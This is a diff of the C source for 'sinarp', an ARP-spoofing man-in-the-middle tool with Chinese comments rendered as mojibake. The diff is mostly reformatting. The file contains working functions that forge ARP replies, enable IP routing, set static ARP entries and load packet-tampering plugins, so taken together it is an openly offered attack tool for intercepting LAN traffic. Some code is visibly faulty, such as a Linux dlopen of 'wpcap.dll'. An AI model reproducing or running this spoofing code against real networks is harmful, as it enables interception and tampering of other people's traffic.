@@ -1,72 +1,65 @@
 /*
-sinarp ARP ÖĞ¼äÈËÆÛÆ­¹¤¾ß
-µ¥Ïò Ë«ÏòÆÛÆ­
-¼ÓÔØ²å¼ş
-¿ÉÒÔ´Û¸ÄÊı¾İ°ü
-»ùÓÚ zxarps  ettercap µÄ´úÂë
-¿ÉÒÔÔÚ windows ºÍ linux ÏÂ±àÒë
+sinarp ARP ä¸­é—´äººæ¬ºéª—å·¥å…·
+å•å‘ åŒå‘æ¬ºéª—
+åŠ è½½æ’ä»¶
+å¯ä»¥ç¯¡æ”¹æ•°æ®åŒ…
+åŸºäº zxarps  ettercap çš„ä»£ç 
+å¯ä»¥åœ¨ windows å’Œ linux ä¸‹ç¼–è¯‘
 
-Ë«ÏòÆÛÆ­£º
+åŒå‘æ¬ºéª—ï¼š
 A<--->M<--->B
-µ¥ÏòÆÛÆ­
+å•å‘æ¬ºéª—
 A --->M---->B
 
-sinarp ²å¼şµÄ½Ó¿Ú
+sinarp æ’ä»¶çš„æ¥å£
 
-plugin_init();  //¼ÓÔØ²å¼ş
-plugin_process_packet(); //´¦ÀíÊı¾İ°ü
-plugin_unload(); //Ğ¶ÔØ²å¼ş
+plugin_init();  //åŠ è½½æ’ä»¶
+plugin_process_packet(); //å¤„ç†æ•°æ®åŒ…
+plugin_unload(); //å¸è½½æ’ä»¶
 
-Ö»¹Ø×¢Ò»¸öC¶Î
+åªå…³æ³¨ä¸€ä¸ªCæ®µ
 
-×îºÃÉèÖÃÏÂ ÈÃ pcap ²»²¶»ñ ×Ô¼º·¢³öÈ¥µÄ°ü
+æœ€å¥½è®¾ç½®ä¸‹ è®© pcap ä¸æ•è· è‡ªå·±å‘å‡ºå»çš„åŒ…
 
 ether src not $YOUR_MAC_ADDRESS
 
-¾­¹ı¼¸ÌìµÄ·ÜÕ½  ÖÕÓÚÕûµÄ²î²»¶àÁË 
+ç»è¿‡å‡ å¤©çš„å¥‹æˆ˜  ç»ˆäºæ•´çš„å·®ä¸å¤šäº†
 
-»ØÈ¥°Ñ ARP ÆÛÆ­ÒªÓÃµ½µÄ Js Ğ´ºÃ 
+å›å»æŠŠ ARP æ¬ºéª—è¦ç”¨åˆ°çš„ Js å†™å¥½
 
-È»ºóÒÆÖ²µ½LinuxÏÂ ~~~
+ç„¶åç§»æ¤åˆ°Linuxä¸‹ ~~~
 
 
-// ip ÆÛÆ­
+// ip æ¬ºéª—
 */
-#define _WSPIAPI_COUNTOF
-#define _CRT_SECURE_NO_WARNINGS
-#include <pcap.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <math.h>
-#ifdef WIN32
-#include <WinSock2.h>
-#include <windows.h>
-#include <IPHlpApi.h>
-#else
-#include <dlfcn.h>
-#include <stdarg.h> //for va_list
-#include <sys/socket.h>
-#include <errno.h> //For errno - the error number
-#include <pthread.h>
-#include <fcntl.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <unistd.h>
-#include <netdb.h>    //hostend
-#include <arpa/inet.h>
-#include <netinet/tcp.h>    //Provides declarations for tcp header
-#include <netinet/ip.h>    //Provides declarations for ip header
-#include <sys/ioctl.h> 
-#include <net/if.h>
-#include <linux/rtnetlink.h>
-#include <signal.h>
-#endif
 #include "sinarp.h"
 #ifdef WIN32
 #pragma comment(lib,"ws2_32")
 #pragma comment(lib,"Iphlpapi.lib")
 #endif
+
+
+//----------  global var
+pcap_t *g_adhandle = NULL;  // ç½‘å¡å¥æŸ„
+char g_opened_if_name[256] = {0};//æ‰“å¡çš„ç½‘å¡åç§° å› ä¸ºæœ‰æ—¶å€™æ’ä»¶éœ€è¦çŸ¥é“ æ‰“å¼€çš„æ˜¯å“ªå—ç½‘å¡ ã€‚ã€‚æ‰€ä»¥è¦æŠŠè¿™ä¸ªå¯¼å‡º
+uint32 g_interval = 3000;//3 s æ¬ºéª—ä¸€æ¬¡
+spoof_type g_spoof_type = SPOOF_AB; //é»˜è®¤æ˜¯åŒå‘æ¬ºéª—
+Host  g_HostList[256]; //æ³¨æ„è¦å…¨éƒ¨åˆå§‹åŒ–ä¸º 0
+uint32 g_my_ip = 0;  // è‡ªå·±çš„ ip ä¹Ÿå°±æ˜¯ä¸­é—´äººçš„ ip
+uint8  g_my_mac[6] = {0}; //è‡ªå·±çš„ mac ä¹Ÿå°±æ˜¯ä¸­é—´äººçš„ mac
+uint32 g_my_netmask = 0; //å­ç½‘æ©ç 
+uint32 g_my_boardcast_addr = 0; //å¹¿æ’­åœ°å€
+uint32   g_my_gw_addr;//ç½‘å…³çš„åœ°å€
+uint8   g_my_gw_mac[6] = {0xFF}; //ç½‘å…³çš„ mac åœ°å€
+uint8   g_broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; //å±€åŸŸç½‘ç”¨äºå¹¿æ’­çš„ MAC åœ°å€
+uint8   g_zero_mac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+volatile uint32 g_is_capture_thread_active = 0;// ==0 çº¿ç¨‹éæ´»åŠ¨çš„
+volatile uint32 g_is_spoof_thread_active = 0;
+volatile uint32 g_is_time_shutdown = 0;//é‚£ä¸¤ä¸ªçº¿ç¨‹æ˜¯ä¸æ˜¯éœ€è¦å…³é—­
+volatile int64_t g_packet_count = 0;//æ•°æ®åŒ…è®¡æ•°
+volatile uint32 g_auto_ip_forward = 1;//é»˜è®¤å¼€å¯è½¬å‘
+plugin_list g_plugin_list = {0};
+
 
 #ifdef WIN32
 #else
@@ -75,13 +68,13 @@ void Sleep(uint32 msec)
     struct timespec slptm;
     slptm.tv_sec = msec / 1000;
     slptm.tv_nsec = 1000 * 1000 * (msec - (msec / 1000) * 1000);      //1000 ns = 1 us
-    if(nanosleep(&slptm,NULL) != -1)
+    if (nanosleep(&slptm, NULL) != -1)
     {
 
     }
     else
     {
-        sinarp_printf("%s : %u","nanosleep failed !!\n",msec);
+        sinarp_printf("%s : %u", "nanosleep failed !!\n", msec);
     }
 }
 #endif
@@ -92,39 +85,39 @@ BOOL  sinarp_load_plugin(const char *szPluginName)
     plugin_info *ptemp_list;
 #ifdef WIN32
     HMODULE hdll = LoadLibraryA(szPluginName);
-    if(hdll == NULL)
+    if (hdll == NULL)
     {
-        DBG_MSG("load library failed   %u !!\n",GetLastError());
+        DBG_MSG("load library failed   %u !!\n", GetLastError());
         return FALSE;
     }
-    plugin.process_packet = (BOOL ( *)(ETHeader *,uint32)) GetProcAddress(hdll,"process_packet");
-	plugin.plugin_init = (BOOL (*)())GetProcAddress(hdll,"plugin_init");
-	plugin.plugin_unload = (void * (*)())GetProcAddress(hdll,"plugin_unload");
+    plugin.process_packet = (BOOL ( *)(ETHeader *, uint32)) GetProcAddress(hdll, "process_packet");
+    plugin.plugin_init = (BOOL ( *)())GetProcAddress(hdll, "plugin_init");
+    plugin.plugin_unload = (void * ( *)())GetProcAddress(hdll, "plugin_unload");
 #else
-    void * hdll = dlopen(szPluginName,RTLD_LAZY);
-    if(hdll == NULL)
+    void *hdll = dlopen(szPluginName, RTLD_LAZY);
+    if (hdll == NULL)
     {
-        DBG_MSG("load library failed   %s !!\n",strerror(errno));
+        DBG_MSG("load library failed   %s !!\n", strerror(errno));
         return FALSE;
     }
-    plugin.process_packet = (BOOL ( *)(ETHeader *,uint32)) dlsym(hdll,"process_packet");
-	plugin.plugin_init = (BOOL (*)())dlsym(hdll,"plugin_init");
-	plugin.plugin_unload = (void * (*)())dlsym(hdll,"plugin_unload");
+    plugin.process_packet = (BOOL ( *)(ETHeader *, uint32)) dlsym(hdll, "process_packet");
+    plugin.plugin_init = (BOOL ( *)())dlsym(hdll, "plugin_init");
+    plugin.plugin_unload = (void * ( *)())dlsym(hdll, "plugin_unload");
 #endif
-    if(plugin.process_packet == NULL || NULL == plugin.plugin_init || NULL == plugin.plugin_unload)
+    if (plugin.process_packet == NULL || NULL == plugin.plugin_init || NULL == plugin.plugin_unload)
     {
         return FALSE;
     }
 
-	if(FALSE == plugin.plugin_init())
-	{
-		return FALSE;
-	}
+    if (FALSE == plugin.plugin_init())
+    {
+        return FALSE;
+    }
 
     plugin.name = strdup(szPluginName);
 
-    //²åµ½²å¼şÁĞ±íÀïÃæ
-    if(g_plugin_list.plugin == NULL)
+    //æ’åˆ°æ’ä»¶åˆ—è¡¨é‡Œé¢
+    if (g_plugin_list.plugin == NULL)
     {
         ptemp_list = (plugin_info *)malloc(sizeof(plugin_info));
         g_plugin_list.plugin = ptemp_list;
@@ -133,66 +126,66 @@ BOOL  sinarp_load_plugin(const char *szPluginName)
     else
     {
         ptemp_list = (plugin_info *)malloc((g_plugin_list.count + 1) * sizeof(plugin_info));
-        memcpy(ptemp_list,g_plugin_list.plugin,g_plugin_list.count * sizeof(plugin_info));
+        memcpy(ptemp_list, g_plugin_list.plugin, g_plugin_list.count * sizeof(plugin_info));
         free(g_plugin_list.plugin);
         g_plugin_list.plugin = ptemp_list;
         ptemp_list = g_plugin_list.plugin + g_plugin_list.count;
         ++g_plugin_list.count;
     }
-    memcpy(ptemp_list,&plugin,sizeof(plugin_info));
+    memcpy(ptemp_list, &plugin, sizeof(plugin_info));
     return TRUE;
 }
 
 BOOL  sinarp_free_plugin_list()
 {
     uint32 idx = 0;
-    if(g_plugin_list.count == 0)
+    if (g_plugin_list.count == 0)
         return FALSE;
-    for (idx  = 0 ;idx < g_plugin_list.count ;idx ++)
+    for (idx  = 0 ; idx < g_plugin_list.count ; idx ++)
     {
-		//µ÷ÓÃÏÂ Ğ¶ÔØµÄº¯Êı
-		g_plugin_list.plugin[idx].plugin_unload();
+        //è°ƒç”¨ä¸‹ å¸è½½çš„å‡½æ•°
+        g_plugin_list.plugin[idx].plugin_unload();
 
         free((void *)g_plugin_list.plugin[idx].name);
     }
     free(g_plugin_list.plugin);
-    ZeroMemory(&g_plugin_list,sizeof(plugin_list));
+    ZeroMemory(&g_plugin_list, sizeof(plugin_list));
     return TRUE;
 }
 
-const char *  sinarp_take_out_string_by_char(const char *Source,char *Dest, int buflen, char ch)
+const char   *sinarp_take_out_string_by_char(const char *Source, char *Dest, int buflen, char ch)
 {
     int i;
     const char *p;
     const char *lpret;
-    if(Source == NULL)
+    if (Source == NULL)
         return NULL;
 
     p = strchr(Source, ch);
-    while(*Source == ' ')
+    while (*Source == ' ')
         Source++;
-    for(i=0; i<buflen && *(Source+i) && *(Source+i) != ch; i++)
+    for (i = 0; i < buflen && *(Source + i) && *(Source + i) != ch; i++)
     {
-        Dest[i] = *(Source+i);
+        Dest[i] = *(Source + i);
     }
-    if(i == 0)
+    if (i == 0)
         return NULL;
     else
         Dest[i] = '\0';
 
-    lpret = p ? p+1 : Source+i;
+    lpret = p ? p + 1 : Source + i;
 
-    while(Dest[i-1] == ' ' && i>0)
-        Dest[i---1] = '\0';
+    while (Dest[i - 1] == ' ' && i > 0)
+        Dest[i-- -1] = '\0';
 
     return lpret;
 }
 
-void  sinarp_inert_hostlist(HostList **pHostList,uint32 ip,uint8 mac[6])
+void  sinarp_inert_hostlist(HostList **pHostList, uint32 ip, uint8 mac[6])
 {
     //    msg("%s:%x %x\n",__func__,start_ip,end_ip);
     HostList *pTmp;
-    if(!*pHostList)
+    if (!*pHostList)
     {
         *pHostList = (HostList *)malloc(sizeof(HostList));
         (*pHostList)->HostCount = 1;
@@ -200,137 +193,138 @@ void  sinarp_inert_hostlist(HostList **pHostList,uint32 ip,uint8 mac[6])
     else
     {
         pTmp = (HostList *)malloc(((*pHostList)->HostCount + 1) * sizeof(HostList));
-        memcpy(pTmp,pHostList,(*pHostList)->HostCount * sizeof(HostList));
+        memcpy(pTmp, pHostList, (*pHostList)->HostCount * sizeof(HostList));
         free(*pHostList);
         *pHostList = pTmp;
         ++(*pHostList)->HostCount;
     }
-    (*pHostList)[(*pHostList)->HostCount-1].pHost->ip = ip;
-    memcpy((*pHostList)[(*pHostList)->HostCount -1].pHost->mac,mac,6);
+    (*pHostList)[(*pHostList)->HostCount - 1].pHost->ip = ip;
+    memcpy((*pHostList)[(*pHostList)->HostCount - 1].pHost->mac, mac, 6);
 };
 
 /*
-Ìí¼ÓÁË »¥³âÁ¿ ·ÀÖ¹¶àÏß³Ì´òÓ¡ »ìÂÒ
+æ·»åŠ äº† äº’æ–¥é‡ é˜²æ­¢å¤šçº¿ç¨‹æ‰“å° æ··ä¹±
 */
 
-void  sinarp_printf(const char * fmt,...)
+void  sinarp_printf(const char *fmt, ...)
 {
     volatile static int cs = 0;
     va_list args;
     int n;
     char TempBuf[8192];
 loop:
-    while(cs == 1)
+    while (cs == 1)
         Sleep(1);
-    if(cs == 0)
+    if (cs == 0)
         cs = 1;
     else
         goto loop;
     va_start(args, fmt);
     n = vsprintf(TempBuf, fmt, args);
-    printf("%s",TempBuf);
+    printf("%s", TempBuf);
     va_end(args);
     cs = 0;
+    fflush(stdout);
     //LeaveCriticalSection(&cs);
 }
 
 
 uint8 *sinarp_load_file_into_mem(const char *file)
 {
-	FILE *fp;
-	long size;
-	uint8 *data;
+    FILE *fp;
+    long size;
+    uint8 *data;
 
-	fp = fopen(file,"r");
-	if(fp == NULL)
-		return NULL;
-    fseek(fp,0L,SEEK_END);
-	size = ftell(fp);
-	if(size > 1)
-	{
-		rewind(fp);
-		data = (uint8 *)malloc(ceil(size / 1024.0) * 1024);
-		if(data)
-		{
-			if(fread(data,1,size,fp))
-			{
-				return data;
-			}
-		}
-		free(data);
-	}
-	fclose(fp);
-	return NULL;
+    fp = fopen(file, "r");
+    if (fp == NULL)
+        return NULL;
+    fseek(fp, 0L, SEEK_END);
+    size = ftell(fp);
+    if (size > 1)
+    {
+        rewind(fp);
+        data = (uint8 *)malloc(ceil(size / 1024.0) * 1024);
+        if (data)
+        {
+            if (fread(data, 1, size, fp))
+            {
+                return data;
+            }
+        }
+        free(data);
+    }
+    fclose(fp);
+    return NULL;
 }
 
 #ifdef WIN32
 //-------------------------------
 
-OVERLAPPED		g_ol;
+OVERLAPPED      g_ol;
 HANDLE g_hrouterevent;
-// ÆôÓÃÂ·ÓÉ
+// å¯ç”¨è·¯ç”±
 BOOL sinarp_start_router()
 {
-    DWORD		dwRet;
-    HANDLE		h_err = NULL;
+    DWORD       dwRet;
+    HANDLE      h_err = NULL;
 
     g_hrouterevent = CreateEvent( NULL, TRUE, FALSE, NULL );
-    if( g_hrouterevent == NULL )
+    if ( g_hrouterevent == NULL )
     {
         return FALSE;
     }
 
-    ZeroMemory( (void*)&g_ol, sizeof( g_ol ) );
+    ZeroMemory( (void *)&g_ol, sizeof( g_ol ) );
 
     g_ol.hEvent = g_hrouterevent;
 
     dwRet = EnableRouter( &h_err, &g_ol );
 
-    if( dwRet == ERROR_IO_PENDING )	return TRUE;
+    if ( dwRet == ERROR_IO_PENDING ) return TRUE;
 
     return FALSE;
 }
 
-// ¹Ø±ÕÂ·ÓÉ
+// å…³é—­è·¯ç”±
 BOOL sinarp_close_router()
 {
-    DWORD		dwRet;
-    DWORD		dwEnableCount = 0;
+    DWORD       dwRet;
+    DWORD       dwEnableCount = 0;
 
     dwRet = UnenableRouter( &g_ol, &dwEnableCount );
 
     CloseHandle( g_hrouterevent );
 
-    if( dwRet == NO_ERROR ) return TRUE;
+    if ( dwRet == NO_ERROR ) return TRUE;
 
     return FALSE;
 }
 #endif
 
 #ifdef WIN32
-// ±íÌ¬°ó¶¨ARPº¯Êı£¬²Ù×÷ARP±í
+// è¡¨æ€ç»‘å®šARPå‡½æ•°ï¼Œæ“ä½œARPè¡¨
 // code from arpspoof,modifyed by shadow
 BOOL sinarp_static_arp( unsigned long ul_ip, unsigned char uc_mac[] )
 {
-    MIB_IPFORWARDROW	ipfrow;
-    MIB_IPNETROW		iprow;
-    DWORD				dwIPAddr = ul_ip;
+    MIB_IPFORWARDROW    ipfrow;
+    MIB_IPNETROW        iprow;
+    DWORD               dwIPAddr = ul_ip;
 
-    if( GetBestRoute( dwIPAddr, ADDR_ANY, &ipfrow ) != NO_ERROR )
+    if ( GetBestRoute( dwIPAddr, ADDR_ANY, &ipfrow ) != NO_ERROR )
     {
         return FALSE;
     }
 
     memset( &iprow, 0, sizeof( iprow ) );
-    iprow.dwIndex		= ipfrow.dwForwardIfIndex;
-    iprow.dwPhysAddrLen	= 6;
+    iprow.dwIndex       = ipfrow.dwForwardIfIndex;
+    iprow.dwPhysAddrLen = 6;
 
     memcpy( iprow.bPhysAddr, uc_mac, 6 );
     iprow.dwAddr = dwIPAddr;
-    iprow.dwType = 4;							// -static
+    iprow.dwType = 4;                           // -static
 
-    if( CreateIpNetEntry( &iprow ) != NO_ERROR )
-    {	
+    if ( CreateIpNetEntry( &iprow ) != NO_ERROR )
+    {
         return FALSE;
     }
 
@@ -338,16 +332,16 @@ BOOL sinarp_static_arp( unsigned long ul_ip, unsigned char uc_mac[] )
 }
 #endif
 
-// ¹¹ÔìARPÊı¾İ±¨
+// æ„é€ ARPæ•°æ®æŠ¥
 int  sinarp_build_arp_packet(\
-    ARP_PACKET *arp_packet,
-    uint16 arp_opcode,//Òª·¢ËÍµÄARP°üµÄÀàĞÍ  
-    uint8 src_mac[6],
-    uint8 dst_mac[6],
-    uint8 arp_src_mac[6],
-    uint32 arp_src_ip,
-    uint8 arp_dst_mac[6],
-    uint32 arp_dst_ip)
+                             ARP_PACKET *arp_packet,
+                             uint16 arp_opcode,//è¦å‘é€çš„ARPåŒ…çš„ç±»å‹
+                             uint8 src_mac[6],
+                             uint8 dst_mac[6],
+                             uint8 arp_src_mac[6],
+                             uint32 arp_src_ip,
+                             uint8 arp_dst_mac[6],
+                             uint32 arp_dst_ip)
 {
     arp_packet->ethdr.type = htons(ETHERTYPE_ARP);
     arp_packet->arphdr.hrd = htons(ARPHRD_ETHER);
@@ -356,44 +350,45 @@ int  sinarp_build_arp_packet(\
     arp_packet->arphdr.iplen = 4;
     arp_packet->arphdr.opcode = htons(arp_opcode);
 
-    memcpy(arp_packet->ethdr.dhost,dst_mac, 6 );		//Ä¿µÄMACµØÖ·¡£(AµÄµØÖ·£©
-    memcpy(arp_packet->ethdr.shost,src_mac, 6 );		//Ô´MACµØÖ·
+    memcpy(arp_packet->ethdr.dhost, dst_mac, 6 );       //ç›®çš„MACåœ°å€ã€‚(Açš„åœ°å€ï¼‰
+    memcpy(arp_packet->ethdr.shost, src_mac, 6 );       //æºMACåœ°å€
 
-    memcpy(arp_packet->arphdr.smac,arp_src_mac, 6 );		//Î±ÔìµÄCµÄMACµØÖ·
+    memcpy(arp_packet->arphdr.smac, arp_src_mac, 6 );       //ä¼ªé€ çš„Cçš„MACåœ°å€
     arp_packet->arphdr.saddr = arp_src_ip;
 
-    memcpy(arp_packet->arphdr.dmac,arp_dst_mac, 6 );		//Ä¿±êAµÄMACµØÖ·
-    arp_packet->arphdr.daddr = arp_dst_ip;					//Ä¿±êAµÄIPµØÖ·
+    memcpy(arp_packet->arphdr.dmac, arp_dst_mac, 6 );       //ç›®æ ‡Açš„MACåœ°å€
+    arp_packet->arphdr.daddr = arp_dst_ip;                  //ç›®æ ‡Açš„IPåœ°å€
 
     return 1;
 }
 
 /*
-·¢ËÍARPÊı¾İ°ü»ñµÃ  dest ip ¶ÔÓ¦µÄ MAC  ²¶»ñÏß³ÌÀïÃæ»áµÃµ½Ô¶³ÌÖ÷»ú»Ø¸´µÄÏûÏ¢ µÃµ½ÆäMACµØÖ·
+å‘é€ARPæ•°æ®åŒ…è·å¾—  dest ip å¯¹åº”çš„ MAC  æ•è·çº¿ç¨‹é‡Œé¢ä¼šå¾—åˆ°è¿œç¨‹ä¸»æœºå›å¤çš„æ¶ˆæ¯ å¾—åˆ°å…¶MACåœ°å€
 */
 BOOL  sinarp_send_arp(uint32 DestIP)
 {
-    ARP_PACKET arp_packet={0};
-    sinarp_build_arp_packet(&arp_packet,ARP_REQUEST,g_my_mac,g_broadcast_mac,g_my_mac,g_my_ip,g_zero_mac,DestIP);
-    if(pf_pcap_sendpacket(g_adhandle, (unsigned char *)&arp_packet, ARP_LEN) < 0)
+    ARP_PACKET arp_packet;
+    memset(&arp_packet, 0, sizeof(arp_packet));
+    sinarp_build_arp_packet(&arp_packet, ARP_REQUEST, g_my_mac, g_broadcast_mac, g_my_mac, g_my_ip, g_zero_mac, DestIP);
+    if (pf_pcap_sendpacket(g_adhandle, (unsigned char *)&arp_packet, ARP_LEN) < 0)
     {
-        sinarp_printf("%s","[!] Forward thread send packet error\n");
+        sinarp_printf("%s", "[!] Forward thread send packet error\n");
         return FALSE;
     }
     return TRUE;
 }
 
 /*
-¸æËß spoof_ip ip ¶ÔÓ¦µÄ MAC ÊÇ mac
+å‘Šè¯‰ spoof_ip ip å¯¹åº”çš„ MAC æ˜¯ mac
 */
-BOOL  sinarp_arp_spoof(uint32 spoof_ip,uint8 *spoof_mac,uint32 ip,uint8 *mac)
+BOOL  sinarp_arp_spoof(uint32 spoof_ip, uint8 *spoof_mac, uint32 ip, uint8 *mac)
 {
-    ARP_PACKET arp_packet={0};
-
-    sinarp_build_arp_packet(&arp_packet,ARP_REPLY,mac,spoof_mac,mac,ip,spoof_mac,spoof_ip);
-    if(pf_pcap_sendpacket(g_adhandle, (unsigned char *)&arp_packet, ARP_LEN) < 0)
+    ARP_PACKET arp_packet;
+    memset(&arp_packet, 0, sizeof(arp_packet));
+    sinarp_build_arp_packet(&arp_packet, ARP_REPLY, mac, spoof_mac, mac, ip, spoof_mac, spoof_ip);
+    if (pf_pcap_sendpacket(g_adhandle, (unsigned char *)&arp_packet, ARP_LEN) < 0)
     {
-        sinarp_printf("%s","[!]sinarp_arp_spoof(): send packet error\n");
+        sinarp_printf("%s", "[!]sinarp_arp_spoof(): send packet error\n");
         return FALSE;
     }
     return TRUE;
@@ -402,29 +397,29 @@ BOOL  sinarp_arp_spoof(uint32 spoof_ip,uint8 *spoof_mac,uint32 ip,uint8 *mac)
 #ifdef WIN32
 BOOL sinarp_init_pcap_funcs()
 {
-    pf_pcap_perror = (void  ( *)(pcap_t *, char *)) GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_perror");
-    pf_pcap_sendpacket = (int  ( * )(pcap_t * ,u_char * ,int )) GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_sendpacket");
-    pf_pcap_next_ex = (int ( *)(pcap_t *, struct pcap_pkthdr **, const u_char **)) GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_next_ex");
-    pf_pcap_freealldevs = (void ( *)( pcap_if_t *)) GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_freealldevs");
-    pf_pcap_close = (void ( *)(pcap_t *))GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_close");
-    pf_pcap_breakloop = (void ( *)(pcap_t *)) GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_breakloop");
-    pf_pcap_loop = (int	( *)(pcap_t *, int, pcap_handler, u_char *)) GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_loop");
-    pf_pcap_open_live = (pcap_t *( *)(const char *,int,int,int,char *)) GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_open_live");
-    pf_pcap_findalldevs = (int ( *)(pcap_if_t **,char *)) GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_findalldevs");
-    pf_pcap_breakloop = (void ( *)(pcap_t *))GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_breakloop");
-    pf_pcap_compile = (int ( *)(pcap_t *, struct bpf_program *, const char *, int, bpf_u_int32))GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_compile");
-    pf_pcap_setfilter = (int ( *)(pcap_t *,struct bpf_program *)) GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_setfilter");
-    if(!(pf_pcap_perror &&
-        pf_pcap_sendpacket &&
-        pf_pcap_next_ex &&
-        pf_pcap_freealldevs &&
-        pf_pcap_close &&
-        pf_pcap_breakloop &&
-        pf_pcap_open_live &&
-        pf_pcap_findalldevs &&
-        pf_pcap_breakloop &&
-        pf_pcap_compile &&
-        pf_pcap_setfilter))
+    pf_pcap_perror = (void  ( *)(pcap_t *, char *)) GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_perror");
+    pf_pcap_sendpacket = (int  ( * )(pcap_t * , u_char * , int )) GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_sendpacket");
+    pf_pcap_next_ex = (int ( *)(pcap_t *, struct pcap_pkthdr **, const u_char **)) GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_next_ex");
+    pf_pcap_freealldevs = (void ( *)( pcap_if_t *)) GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_freealldevs");
+    pf_pcap_close = (void ( *)(pcap_t *))GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_close");
+    pf_pcap_breakloop = (void ( *)(pcap_t *)) GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_breakloop");
+    pf_pcap_loop = (int ( *)(pcap_t *, int, pcap_handler, u_char *)) GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_loop");
+    pf_pcap_open_live = (pcap_t * ( *)(const char *, int, int, int, char *)) GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_open_live");
+    pf_pcap_findalldevs = (int ( *)(pcap_if_t **, char *)) GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_findalldevs");
+    pf_pcap_breakloop = (void ( *)(pcap_t *))GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_breakloop");
+    pf_pcap_compile = (int ( *)(pcap_t *, struct bpf_program *, const char *, int, bpf_u_int32))GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_compile");
+    pf_pcap_setfilter = (int ( *)(pcap_t *, struct bpf_program *)) GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_setfilter");
+    if (!(pf_pcap_perror &&
+            pf_pcap_sendpacket &&
+            pf_pcap_next_ex &&
+            pf_pcap_freealldevs &&
+            pf_pcap_close &&
+            pf_pcap_breakloop &&
+            pf_pcap_open_live &&
+            pf_pcap_findalldevs &&
+            pf_pcap_breakloop &&
+            pf_pcap_compile &&
+            pf_pcap_setfilter))
     {
         return FALSE;
     }
@@ -433,29 +428,29 @@ BOOL sinarp_init_pcap_funcs()
 #else // for linux 
 BOOL sinarp_init_pcap_funcs()
 {
-    pf_pcap_perror = (void  ( *)(pcap_t *, char *)) dlsym(dlopen("libpcap.so",RTLD_LAZY),"pcap_perror");
-    pf_pcap_sendpacket = (int  ( * )(pcap_t * ,u_char * ,int )) dlsym(dlopen("libpcap.so",RTLD_LAZY),"pcap_sendpacket");
-    pf_pcap_next_ex = (int ( *)(pcap_t *, struct pcap_pkthdr **, const u_char **)) dlsym(dlopen("libpcap.so",RTLD_LAZY),"pcap_next_ex");
-    pf_pcap_freealldevs = (void ( *)( pcap_if_t *)) dlsym(dlopen("libpcap.so",RTLD_LAZY),"pcap_freealldevs");
-    pf_pcap_close = (void ( *)(pcap_t *))dlsym(dlopen("libpcap.so",RTLD_LAZY),"pcap_close");
-    pf_pcap_breakloop = (void ( *)(pcap_t *)) dlsym(dlopen("wpcap.dll",RTLD_LAZY),"pcap_breakloop");
-    pf_pcap_loop = (int	( *)(pcap_t *, int, pcap_handler, u_char *)) dlsym(dlopen("libpcap.so",RTLD_LAZY),"pcap_loop");
-    pf_pcap_open_live = (pcap_t *( *)(const char *,int,int,int,char *)) dlsym(dlopen("libpcap.so",RTLD_LAZY),"pcap_open_live");
-    pf_pcap_findalldevs = (int ( *)(pcap_if_t **,char *)) dlsym(dlopen("libpcap.so",RTLD_LAZY),"pcap_findalldevs");
-    pf_pcap_breakloop = (void ( *)(pcap_t *))dlsym(dlopen("libpcap.so",RTLD_LAZY),"pcap_breakloop");
-    pf_pcap_compile = (int ( *)(pcap_t *, struct bpf_program *, const char *, int, bpf_u_int32))dlsym(dlopen("libpcap.so",RTLD_LAZY),"pcap_compile");
-    pf_pcap_setfilter = (int ( *)(pcap_t *,struct bpf_program *)) dlsym(dlopen("libpcap.so",RTLD_LAZY),"pcap_setfilter");
-    if(!(pf_pcap_perror &&
-        pf_pcap_sendpacket &&
-        pf_pcap_next_ex &&
-        pf_pcap_freealldevs &&
-        pf_pcap_close &&
-        pf_pcap_breakloop &&
-        pf_pcap_open_live &&
-        pf_pcap_findalldevs &&
-        pf_pcap_breakloop &&
-        pf_pcap_compile &&
-        pf_pcap_setfilter))
+    pf_pcap_perror = (void  ( *)(pcap_t *, char *)) dlsym(dlopen("libpcap.so", RTLD_LAZY), "pcap_perror");
+    pf_pcap_sendpacket = (int  ( * )(pcap_t * , u_char * , int )) dlsym(dlopen("libpcap.so", RTLD_LAZY), "pcap_sendpacket");
+    pf_pcap_next_ex = (int ( *)(pcap_t *, struct pcap_pkthdr **, const u_char **)) dlsym(dlopen("libpcap.so", RTLD_LAZY), "pcap_next_ex");
+    pf_pcap_freealldevs = (void ( *)( pcap_if_t *)) dlsym(dlopen("libpcap.so", RTLD_LAZY), "pcap_freealldevs");
+    pf_pcap_close = (void ( *)(pcap_t *))dlsym(dlopen("libpcap.so", RTLD_LAZY), "pcap_close");
+    pf_pcap_breakloop = (void ( *)(pcap_t *)) dlsym(dlopen("wpcap.dll", RTLD_LAZY), "pcap_breakloop");
+    pf_pcap_loop = (int ( *)(pcap_t *, int, pcap_handler, u_char *)) dlsym(dlopen("libpcap.so", RTLD_LAZY), "pcap_loop");
+    pf_pcap_open_live = (pcap_t * ( *)(const char *, int, int, int, char *)) dlsym(dlopen("libpcap.so", RTLD_LAZY), "pcap_open_live");
+    pf_pcap_findalldevs = (int ( *)(pcap_if_t **, char *)) dlsym(dlopen("libpcap.so", RTLD_LAZY), "pcap_findalldevs");
